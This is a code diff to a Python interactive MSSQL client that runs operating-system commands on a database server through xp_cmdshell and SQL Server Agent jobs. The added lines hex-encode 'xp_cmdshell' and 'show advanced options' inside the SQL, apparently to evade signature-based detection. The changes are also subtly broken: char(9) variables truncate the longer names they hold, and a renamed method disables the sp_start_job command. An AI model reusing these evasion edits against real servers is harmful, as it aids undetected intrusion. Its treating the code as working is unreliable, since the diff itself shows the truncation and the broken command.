@@ -47,21 +47,21 @@ if __name__ == '__main__':
      xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
      sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
      ! {cmd}                    - executes a local shell cmd
-     """) 
+     """)
 
         def do_shell(self, s):
             os.system(s)
 
         def do_xp_cmdshell(self, s):
             try:
-                self.sql.sql_query("exec master..xp_cmdshell '%s'" % s)
+                self.sql.sql_query("DECLARE @x char(11); SET @x=0x78705f636d647368656c6c" + "; DECLARE @z char(184); SET @z=0x" + s.encode('utf-8').hex() + ";EXEC @x " + "@z")
                 self.sql.printReplies()
                 self.sql.colMeta[0]['TypeData'] = 80*2
                 self.sql.printRows()
             except:
                 pass
 
-        def do_sp_start_job(self, s):
+        def sp_start_job(self, s):
             try:
                 self.sql.sql_query("DECLARE @job NVARCHAR(100);"
                                    "SET @job='IdxDefrag'+CONVERT(NVARCHAR(36),NEWID());"
@@ -81,11 +81,10 @@ if __name__ == '__main__':
                 print(os.getcwd())
             else:
                 os.chdir(s)
-    
+
         def do_enable_xp_cmdshell(self, line):
             try:
-                self.sql.sql_query("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;"
-                                   "exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
+                self.sql.sql_query("DECLARE @d char(9); SET @d=0x73686f7720616476616e636564206f7074696f6e73; EXEC sp_configure @d, 1; RECONFIGURE; DECLARE @x char(9); SET @x=0x78705f636d647368656c6c; EXEC sp_configure @x, 1; RECONFIGURE;")
                 self.sql.printReplies()
                 self.sql.printRows()
             except:
@@ -93,8 +92,7 @@ if __name__ == '__main__':
 
         def do_disable_xp_cmdshell(self, line):
             try:
-                self.sql.sql_query("exec sp_configure 'xp_cmdshell', 0 ;RECONFIGURE;exec sp_configure "
-                                   "'show advanced options', 0 ;RECONFIGURE;")
+                self.sql.sql_query("DECLARE @r char(11); SET @r=0x78705f636d647368656c6c; EXEC sp_configure @r, 0; RECONFIGURE; DECLARE @b char(9); SET @b=0x73686f7720616476616e636564206f7074696f6e73; EXEC sp_configure @b, 0; RECONFIGURE;")
                 self.sql.printReplies()
                 self.sql.printRows()
             except:
@@ -107,7 +105,7 @@ if __name__ == '__main__':
                 self.sql.printRows()
             except:
                 pass
-         
+
         def emptyline(self):
             pass
 
@@ -143,7 +141,7 @@ if __name__ == '__main__':
     if len(sys.argv)==1:
         parser.print_help()
         sys.exit(1)
- 
+
     options = parser.parse_args()
 
     if options.debug is True:
